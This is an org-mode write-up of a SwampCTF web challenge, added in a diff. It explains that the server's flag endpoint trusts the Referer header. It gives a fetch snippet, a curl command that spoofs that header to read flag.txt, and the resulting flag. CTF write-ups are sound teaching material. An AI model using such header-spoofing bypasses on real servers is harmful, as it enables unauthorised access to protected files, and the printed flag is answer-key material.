@@ -1,0 +1,26 @@
+* Description
+I took a few hours to create a simple HTML/CSS previewer system. Since there's no way to add JavaScript then my server should be safe, right?
+
+Grab the flag from the http://chals.swampctf.com:47821/flag.txt file on the server to show that this isn't the case.
+
+The flag is in the standard format. Good luck!
+http://chals.swampctf.com:47821 
+
+* Solution
+
+[[file:clipboard-20250404T172840.png]]
+
+Let's access the ~/flag~ endpoint according to the description.
+[[file:clipboard-20250404T174450.png]]
+
+In backend logic, we see that ~Referer~ HTTP header get checked. this is a *misconfigured CORS* (Cross-Origin Resource Sharing)
+[[file:clipboard-20250404T174350.png]]
+
+So we can get ~/flag~ by ~await fetch("flag.txt").then(response=>response.text())~
+[[file:clipboard-20250404T175024.png]]
+
+Or custom ~Referer~ header to bypass the checker:
+#+begin_src shell
+ctf ❯ curl 'http://chals.swampctf.com:47821/flag.txt' -H 'Referer: http://chals.swampctf.com:47821/flag'
+swampCTF{c55_qu3r135_n07_j5}%
+#+end_src
